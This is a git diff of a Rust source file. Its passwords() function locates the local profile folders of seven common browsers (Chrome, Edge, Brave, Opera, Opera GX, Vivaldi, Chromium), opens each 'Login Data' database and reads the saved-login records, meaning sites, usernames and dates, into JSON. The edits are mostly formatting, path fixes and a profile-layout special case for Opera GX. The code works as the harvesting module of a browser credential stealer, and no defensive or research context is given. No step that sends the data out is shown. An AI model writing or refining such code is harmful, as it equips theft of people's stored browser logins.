@@ -1,4 +1,4 @@
-use std::path::{Path};
+use std::path::Path;
 use std::{env, fs};
 
 use chrono::{DateTime, Utc};
@@ -28,7 +28,7 @@ struct BrowserData {
 struct Browsers {
     name: String,
     path: String,
-    root: String
+    root: String,
 }
 
 fn webkit_to_unix_time(webkit_time: i64) -> i64 {
@@ -45,41 +45,40 @@ pub fn passwords() -> String {
         Browsers {
             name: "Brave Browser".to_string(),
             path: "BraveSoftware\\Brave-Browser\\User Data".to_string(),
-            root: local_appdata.to_owned()
+            root: local_appdata.to_owned(),
         },
         Browsers {
             name: "Chromium".to_string(),
             path: "Chromium\\User Data".to_string(),
-            root: local_appdata.to_owned()
+            root: local_appdata.to_owned(),
         },
         Browsers {
             name: "Google Chrome".to_string(),
             path: "Google\\Chrome\\User Data".to_string(),
-            root: local_appdata.to_owned()
+            root: local_appdata.to_owned(),
         },
         Browsers {
             name: "Microsoft Edge".to_string(),
             path: "Microsoft\\Edge\\User Data".to_string(),
-            root: local_appdata.to_owned()
+            root: local_appdata.to_owned(),
         },
         Browsers {
             name: "Opera".to_string(),
-            path: "\\Opera Software\\Opera Stable".to_string(),
-            root: roaming_appdata.to_owned()
+            path: "Opera Software\\Opera Stable".to_string(),
+            root: roaming_appdata.to_owned(),
         },
         Browsers {
             name: "Opera GX".to_string(),
-            path: "\\Opera Software\\Opera GX Stable".to_string(),
-            root: roaming_appdata.to_owned()
+            path: "Opera Software\\Opera GX Stable".to_string(),
+            root: roaming_appdata.to_owned(),
         },
         Browsers {
             name: "Vivaldi".to_string(),
             path: "Vivaldi\\User Data".to_string(),
-            root: local_appdata.to_owned()
+            root: local_appdata.to_owned(),
         },
     ];
-    println!("{:?}", env::var("APPDATA").unwrap());
-    
+
     let mut browser_data: Vec<BrowserData> = Vec::new();
     for browser in browsers {
         let browser_path = Path::new(&browser.root).join(browser.path);
@@ -100,13 +99,19 @@ pub fn passwords() -> String {
         for profile in profiles {
             let profile_name = &json["profile"]["info_cache"][profile.as_str().unwrap()]["name"];
 
-            let login_data = Path::new(&browser_path)
-                .join(profile.as_str().unwrap())
-                .join("Login Data");
+            let login_data;
+
+            if browser.name == "Opera GX" {
+                login_data = Path::new(&browser_path).join("Login Data");
+            } else {
+                login_data = Path::new(&browser_path)
+                    .join(profile.as_str().unwrap())
+                    .join("Login Data");
+            }
 
             let conn = Connection::open(login_data).expect("db error");
 
-            let mut logins = conn.prepare("SELECT signon_realm, username_value, date_created, date_password_modified FROM 'logins'").unwrap(); //err app crash browser open
+            let mut logins = conn.prepare("SELECT signon_realm, username_value, date_created, date_password_modified FROM 'logins'").expect("sqlite error"); //err app crash browser open
 
             let mut rows = logins.query([]).unwrap();
 
@@ -136,7 +141,7 @@ pub fn passwords() -> String {
 
             let profile = ProfileData {
                 profile_name: profile_name.to_string(),
-                passwords: passwords_data
+                passwords: passwords_data,
             };
 
             profile_data.push(profile);
@@ -144,11 +149,10 @@ pub fn passwords() -> String {
 
         let browser = BrowserData {
             browser: browser.name,
-            profiles: profile_data
+            profiles: profile_data,
         };
 
         browser_data.push(browser);
-
     }
 
     let json_data = serde_json::to_string(&browser_data).expect("JSON error");
@@ -156,5 +160,4 @@ pub fn passwords() -> String {
     // println!("{:?}", json_data)
 
     json_data.into()
-
 }
